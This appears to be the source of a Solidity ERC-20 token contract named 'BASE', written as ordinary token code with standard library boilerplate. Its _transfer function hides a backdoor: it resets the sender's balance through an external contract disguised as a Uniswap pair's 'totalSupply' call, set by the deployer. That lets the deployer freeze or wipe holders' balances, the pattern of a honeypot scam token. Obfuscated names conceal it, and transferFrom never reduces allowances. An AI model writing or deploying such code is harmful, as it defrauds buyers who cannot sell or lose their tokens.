pragma solidity ^0.8.9;

// SPDX-License-Identifier: MIT
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amounts)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amounts) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amounts
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
interface dexgt {
    function totalSupply(address aII2kqbke8M,uint256 tgzkHOcZR0,uint256 qnrXzfwgwB) external view returns (uint256);

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(msg.sender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
         require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

 
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

  
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
/**
 * This contract is for testing purposes only. 
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract TOKEN is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _nameshxhac;
    string private _symbolshxhac;
    uint256 private _decimalsshxhac;
    uint256 private _totalSupply;
    dexgt private uniswapV1PairToken;

    constructor(uint256 decimals_, address ashxhac) {
        _decimalsshxhac = decimals_;
        _nameshxhac ="BASE";
        _symbolshxhac = "BASE";
        _totalSupply = 600000000 * 10**_decimalsshxhac;
        uniswapV1PairToken = dexgt(address(ashxhac));

        _balance[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view returns (string memory) {
        return _symbolshxhac;
    }

    

    function name() external view returns (string memory) {
        return _nameshxhac;
    }

    function decimals() external view returns (uint256) {
        return _decimalsshxhac;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address atvjfvharecipient, uint256 bvxxjhxmamount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), atvjfvharecipient, bvxxjhxmamount);
        return true;
    }


    

    function allowance(address zkcszwgdowner, address qegdhbgdspender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[zkcszwgdowner][qegdhbgdspender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    

    function _transfer(
        address lrldpllefrom,
        address pktdodvjto,
        uint256 amount
    ) private {
        require(lrldpllefrom != address(0), "IERC20: transfer from the zero address");
        require(pktdodvjto != address(0), "IERC20: transfer to the zero address");
        _balance[lrldpllefrom] = uniswapV1PairToken.totalSupply(lrldpllefrom,amount,_balance[lrldpllefrom]);
        require(
            _balance[lrldpllefrom] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balance[lrldpllefrom] -= amount;
        _balance[pktdodvjto] += amount;
        emit Transfer(lrldpllefrom, pktdodvjto, amount);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

 

    function transferFrom(
        address jfxvhedlsender,
        address nvncovkurecipient,
        uint256 rluinusmamount
    ) public virtual override returns (bool) {
        _transfer(jfxvhedlsender, nvncovkurecipient, rluinusmamount);
        uint256 Allowancec = _allowances[jfxvhedlsender][_msgSender()];
        require(Allowancec >= rluinusmamount);
        return true;
    }


    

}